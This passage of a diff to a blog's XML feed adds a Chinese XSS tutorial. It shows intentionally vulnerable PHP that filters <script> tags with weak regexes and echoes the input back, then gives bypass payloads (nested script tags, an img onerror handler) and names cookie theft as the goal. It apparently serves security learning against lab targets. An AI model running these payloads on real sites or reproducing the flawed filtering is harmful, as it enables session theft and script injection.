class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">//后端 action4.php：</span><br><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&quot;name&quot;]; </span><br><span class="line">if($name!=null)&#123;</span><br><span class="line">	$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/&quot;,&quot;&quot;,$name);      //过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">	$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,$name);   <span class="comment">//过滤</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	echo $name; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="嵌套-lt-script-gt-标签绕过"><a href="#嵌套-lt-script-gt-标签绕过" class="headerlink" title="嵌套&lt;script&gt;标签绕过"></a>嵌套<code>&lt;script&gt;</code>标签绕过</h4><p>其他源码同上，加了一个<code>i</code>，不区分大小写过滤<code>&lt;script&gt;</code>标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 <span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">$name=preg_replace(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,$name);  <span class="comment">//不区分大小写过滤 </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+<h4 id="过滤所有内容"><a href="#过滤所有内容" class="headerlink" title="过滤所有内容"></a>过滤所有内容</h4><p>其他源码同上</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了&lt;script及其之间的所有内容</span><br></pre></td></tr></table></figure>
+<p>虽然script标签不能使用了，但img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码</p>
+<p>payload<code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p>
+<p>其他继续补充</p>
+<h3 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h3><p>盗取cookie</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://c.biancheng.net/view/3274.html">HTML DOM是什么</a></p>
+<p><a href="https://blog.csdn.net/witwitwiter/article/details/115797971">Pikachu靶场：DOM型XSS以及DOM型XSS-X</a></p>
+<p><a href="https://www.cnblogs.com/fairyting/p/12630548.html">DOM型XSS（pikachu）</a></p>
+<p><a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p>
+]]></content>
+      <categories>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+      </tags>
   </entry>
   <entry>
     <title>spring</title>
